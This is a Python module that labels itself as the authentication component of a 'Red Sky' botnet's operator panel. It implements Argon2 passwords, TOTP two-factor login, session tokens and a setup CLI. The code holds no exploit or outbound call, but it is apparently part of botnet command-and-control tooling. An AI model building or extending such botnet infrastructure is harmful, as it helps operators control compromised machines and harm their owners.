# language: Python, file: Program/botnet/auth.py, target: Red Sky botnet — panel auth
# Argon2 password + TOTP 2FA for the panel. Stored in Data/panel_auth.json.

import base64
import hashlib
import json
import os
import secrets
import sys
import time
from pathlib import Path
from typing import Dict, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import DATA_DIR


AUTH_FILE = DATA_DIR / "panel_auth.json"


class PanelAuth:
    def __init__(self, path: Path = None):
        self.path = path or AUTH_FILE
        self.data = self._load()

    def _load(self) -> Dict:
        if not self.path.exists():
            return {}
        try:
            return json.loads(self.path.read_text())
        except (json.JSONDecodeError, OSError):
            return {}

    def _save(self):
        self.path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self.path.with_suffix(".json.tmp")
        tmp.write_text(json.dumps(self.data, indent=2))
        tmp.replace(self.path)
        try:
            os.chmod(self.path, 0o600)
        except OSError:
            pass

    # ── password ──
    def has_password(self) -> bool:
        return "password_hash" in self.data

    def set_password(self, password: str):
        try:
            from argon2 import PasswordHasher
        except ImportError:
            raise RuntimeError("argon2-cffi not installed — pip install argon2-cffi")
        ph = PasswordHasher()
        self.data["password_hash"] = ph.hash(password)
        self.data["password_set_at"] = int(time.time())
        self._save()

    def verify_password(self, password: str) -> bool:
        if "password_hash" not in self.data:
            return False
        try:
            from argon2 import PasswordHasher
            from argon2.exceptions import VerifyMismatchError
        except ImportError:
            return False
        ph = PasswordHasher()
        try:
            ph.verify(self.data["password_hash"], password)
            return True
        except VerifyMismatchError:
            return False
        except Exception:
            return False

    # ── TOTP ──
    def has_totp(self) -> bool:
        return "totp_secret" in self.data

    def gen_totp_secret(self) -> str:
        try:
            import pyotp
        except ImportError:
            raise RuntimeError("pyotp not installed — pip install pyotp")
        secret = pyotp.random_base32()
        self.data["totp_secret"] = secret
        self._save()
        return secret

    def totp_uri(self, account: str = "operator") -> str:
        if "totp_secret" not in self.data:
            return ""
        try:
            import pyotp
        except ImportError:
            return ""
        return pyotp.totp.TOTP(self.data["totp_secret"]).provisioning_uri(
            name=account, issuer_name="Red Sky")

    def verify_totp(self, code: str) -> bool:
        if "totp_secret" not in self.data:
            return True  # not enabled
        try:
            import pyotp
        except ImportError:
            return False
        totp = pyotp.TOTP(self.data["totp_secret"])
        return totp.verify(code.strip().replace(" ", ""), valid_window=1)

    # ── session tokens ──
    def new_session(self) -> Tuple[str, int]:
        token = secrets.token_urlsafe(32)
        expires = int(time.time()) + 24 * 3600
        sessions = self.data.setdefault("sessions", {})
        sessions[token] = {"expires": expires, "created": int(time.time())}
        # prune expired
        now = int(time.time())
        for t in list(sessions):
            if sessions[t].get("expires", 0) < now:
                del sessions[t]
        self._save()
        return token, expires

    def verify_session(self, token: str) -> bool:
        s = self.data.get("sessions", {}).get(token)
        if not s:
            return False
        return s.get("expires", 0) > int(time.time())

    def drop_session(self, token: str):
        self.data.get("sessions", {}).pop(token, None)
        self._save()

    # ── CLI helpers ──
    def first_run(self) -> bool:
        """Interactive setup for the first launch."""
        print()
        print(f"{SCARLET}{BOLD}▓ panel auth not configured{RESET}")
        print()
        try:
            pw = input(f"{ARTERY}?{RESET} set operator password: ").strip()
            if not pw:
                print_err("empty password — aborting")
                return False
            confirm = input(f"{ARTERY}?{RESET} confirm password: ").strip()
            if pw != confirm:
                print_err("passwords don't match")
                return False
            self.set_password(pw)
            print_ok("password set")

            enable = input(f"{ARTERY}?{RESET} enable TOTP 2FA? [Y/n] ").strip().lower()
            if enable in ("", "y", "yes"):
                secret = self.gen_totp_secret()
                uri = self.totp_uri()
                print()
                print(f"{ARTERY}▓ TOTP secret:{RESET} {BONE}{secret}{RESET}")
                print(f"{ARTERY}▓ TOTP URI:{RESET}    {ASH}{uri}{RESET}")
                print()
                print_info("scan the URI with any authenticator app")
                print_info("or enter the secret manually")
                print()
            return True
        except (EOFError, KeyboardInterrupt):
            print()
            return False


def cmd_setup() -> int:
    a = PanelAuth()
    if a.has_password():
        print_warn("panel auth already configured — overwrite? [y/N]")
        try:
            if input("> ").strip().lower() != "y":
                return 0
        except (EOFError, KeyboardInterrupt):
            return 0
    return 0 if a.first_run() else 1


def cmd_reset() -> int:
    a = PanelAuth()
    a.data.pop("password_hash", None)
    a.data.pop("totp_secret", None)
    a.data.pop("sessions", None)
    a._save()
    print_ok("panel auth reset — run setup to configure again")
    return 0


def cmd_show() -> int:
    a = PanelAuth()
    print()
    print_kv("password set", "yes" if a.has_password() else "no")
    print_kv("totp enabled", "yes" if a.has_totp() else "no")
    print_kv("sessions", len(a.data.get("sessions", {})))
    print()
    if a.has_totp():
        print_kv("totp secret", a.data["totp_secret"])
        print_kv("totp uri", a.totp_uri())
    return 0


def run_cli(args) -> int:
    if not args:
        print_err("usage: redsky botnet auth <setup|reset|show>")
        return 2
    sub = args[0].lower()
    if sub == "setup":
        return cmd_setup()
    if sub == "reset":
        return cmd_reset()
    if sub == "show":
        return cmd_show()
    print_err(f"unknown auth action: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
